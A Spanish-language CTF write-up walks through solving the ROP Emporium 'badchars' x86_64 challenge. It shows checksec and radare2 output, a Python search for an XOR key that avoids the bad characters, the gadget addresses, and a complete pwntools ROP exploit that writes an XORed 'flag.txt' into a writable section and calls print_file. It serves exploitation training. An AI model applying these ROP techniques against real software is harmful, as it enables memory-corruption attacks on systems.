---
layout: post
title: Badchars ROP Emporium (x86_64)
comments: true
categories: [Pwn, Writeups, ROPEmporium]
---

Este es otro post de la serie de writeups de [ROP Emporium](https://ropemporium.com/challenge/split.html). Con esta serie de posts aprenderemos sobre una de las técnicas más utilizadas en la explotación de binarios, la [***ROP***]({% post_url 2024-08-15-ROP %}), ó *Return Orineted Programming* (Programación orientada a *return*).

Concretamente en este reto, lidiaremos con carácteres que el programa no interpreta correctamente.

# x86_64 (Intended)
## Reconocimiento

Como siempre comenzamos lanzando checksec:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

Según el enunciado, el reto es igual al anterior. Pero, debemos lidiar con *badchars*, es decir, carácteres que el binario no puede interpretar correctamente.

Primero analizaremos con gdb-pwndbg:

```
0x00000000004004d8  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
```

Al ejecutar el binario nos lista los badchars:

```
[...]
badchars are: 'x', 'g', 'a', '.'
```

Nuestro problema es que necesitamos dichos carácteres para formar la cadena `flag.txt`. Para ello utilizaremos una técnica que consiste en aplicar un *XOR* al valor que introducimos y revertirlo mediante un gadget. Por ejemplo, si aplicamos un XOR a cada byte de `flag.txt` con un `2`, obtenemos `646e63652c767a76`, y si volvemos a aplicarlo, volvemos a tener `flag.txt`.

Para encontrar un valor con el que aplicar el XOR que no genere ningún badchar, podemos utilizar [[python]]:

```python
badchars = [0x61, 0x67, 0x78, 0x2e]  
_string = "flag.txt"  
#Loop 0 to 255  
for i in xrange(255):  
    flag = True  
    # 8 loops, for 8 bytes we concat the result of the xor  
    new_string = "".join([chr(i^ord(_string[x])) for x in xrange(len(_string))])  
    #Now we loop through all 8 bytes of bad chars and if it's found in new string we ignore it  
    for b in badchars:  
        if chr(b) in new_string:  
            flag = False  
    #If we made it past the bad character check we print out the result and exit  
    if flag:  
        print "^"+str(i)  
        print new_string.encode('hex')  
        exit()
```

Con **ropper** podemos buscar gadgets excluyendo dichos badchars:

```asm
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
0x0000000000400634: mov qword ptr [r13], r12; ret;
0x0000000000400628: xor byte ptr [r15], r14b; ret;
0x00000000004006a3: pop rdi; ret;
```

El gadget más importante es el que nos permite realizar un *XOR* al contenido de la dirección guardada en *r15*. Para ello, utilizaremos el `mov qword ptr [r13], r12; ret;` para guardar la cadena en una sección con permisos de R/W.

Por tanto, ambos, *r13* y *r15* apuntarán a dicha sección, *r12* contendrá la cadena y *r14* la clave para el XOR (`0x02`).

Además, debemos buscar una sección con permisos de lectura/escritura donde guardar los datos, lo haremos con *radare2*:

```bash
[0x00400520]> iS
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7e 0x004003c0   0x7e -r-- STRTAB      .dynstr
7   0x0000043e   0x14 0x0040043e   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000458   0x20 0x00400458   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000478   0x30 0x00400478   0x30 -r-- RELA        .rela.dyn
10  0x000004a8   0x30 0x004004a8   0x30 -r-- RELA        .rela.plt
11  0x000004d8   0x17 0x004004d8   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x192 0x00400520  0x192 -r-x PROGBITS    .text
14  0x000006b4    0x9 0x004006b4    0x9 -r-x PROGBITS    .fini
15  0x000006c0   0x10 0x004006c0   0x10 -r-- PROGBITS    .rodata
16  0x000006d0   0x44 0x004006d0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000718  0x120 0x00400718  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f8 0x00000000  0x1f8 ---- STRTAB      .strtab
28  0x00001878  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```

Utilizaremos, al igual que en el ejercicio anterior, la sección *.bss*.

## Explotación

El script será muy similar al anterior, pero deberemos aplicar el XOR a los datos:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
context.arch = 'amd64'
context.bits = 64
exe = './badchars'

def start():
    
    return process(exe)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def xor2(str):
    res = ""
    for i in str:
        res += chr(int(hex(ord(i))[2::], 16) ^ 2)
    return res

io = start()

# DEBUG
#gdb.attach(io, '''
#    break *0x0000000000400628
#    continue
#''')

padding=40*b'A' #Same as previous

# 0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
pop_values = p64(0x000000000040069c)

xor_key = p64(0x2)

xored_flag = bytes(xor2("flag.txt"), 'utf-8')


rw_section = 0x00601030

# 0x0000000000400634: mov qword ptr [r13], r12; ret;
load_string = p64(0x0000000000400634)

# 0x00000000004006a0: pop r14; pop r15; ret; 
popr14_r15_ret = p64(0x00000000004006a0)

# 0x0000000000400628: xor byte ptr [r15], r14b; ret;
xor = p64(0x0000000000400628)


# 0x00000000004006a3: pop rdi; ret;
pop_rdi = p64(0x00000000004006a3)

# 0x0000000000400510  print_file@plt
print_file = p64(0x0000000000400620)

payload = padding + pop_values + xored_flag + p64(rw_section) + xor_key + p64(rw_section)
payload += load_string

# Iteramos los 8 bytes de la cadena
for i in range(8):
    payload += popr14_r15_ret
    payload += p64(2)
    payload += p64(rw_section + i)
    payload += xor

payload += pop_rdi + p64(rw_section) + print_file

io.send(payload)

io.interactive()
```

Y hasta aquí el writeup de este ejercicio. ¡Nos vemos en el siguiente post!